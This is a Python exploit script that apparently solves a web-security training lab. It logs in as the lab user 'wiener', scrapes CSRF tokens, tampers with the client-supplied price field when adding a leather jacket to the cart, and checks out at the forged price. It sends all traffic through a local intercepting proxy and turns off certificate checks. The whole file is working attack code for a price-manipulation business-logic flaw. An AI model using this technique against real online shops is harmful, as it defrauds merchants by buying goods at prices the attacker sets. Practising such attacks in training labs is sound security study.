import requests
import sys
import urllib3
from bs4 import BeautifulSoup
from math import ceil

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}


def price_tampering(url, session):
    print("[*] Obtaining CSRF token")
    csrf = get_csrf(url + "/login", session)
    print("[*] Logging in as wiener")
    login_response = login(url, csrf, session)
    data = {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": 100}
    add_to_cart = session.post(proxies=proxy,
                               data=data,
                               verify=False,
                               url=url + "/cart")
    csrf = get_csrf(url + "/my-account?id=wiener", session)
    if add_to_cart.status_code == 200:
        print("[*] Leather Jacket added to cart successfully")
    else:
        print("[*] Failed to add the jacket to cart")
        print("[*] Exploit Failed :((")
        sys.exit(-1)

    place_order = session.post(url=url + "/cart/checkout",
                               proxies=proxy,
                               verify=False,
                               data={"csrf": csrf})
    if place_order.status_code == 200:
        print("[*] Order placed successfuly")
        print("[*] Lab Solved !!")
    else:
        print("[*] Something went wrong")
        print("[*] Eploit Failed :((")
        sys.exit(-1)


def login(url, csrf, session, username="wiener", password="peter"):
    login_data = {"csrf": csrf, "username": username.strip(), "password": password.strip()}
    login_url = url + "/login"
    login_response = session.post(url=login_url,
                                  data=login_data,
                                  proxies=proxy,
                                  verify=False,
                                  )
    if "Invalid username or password." not in login_response.text and login_response.status_code == 200:
        print("[*] Login successful")
        return login_response
    else:
        print("[*] Login Failed")
        print(login_response.text)
        sys.exit(-1)


def get_csrf(url, session):
    response = session.get(url, verify=False, proxies=proxy)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    return csrf_token


def main():
    if len(sys.argv) != 2:
        print("[*] Wrong tool Usage!")
        print(f"[*] Usage {sys.argv[0]} <url> ")
        print(f"[*] Example {sys.argv[0]} https://example.com")
        sys.exit(-1)
    else:
        session = requests.Session()

        price_tampering(sys.argv[1], session)


if __name__ == "__main__":
    main()

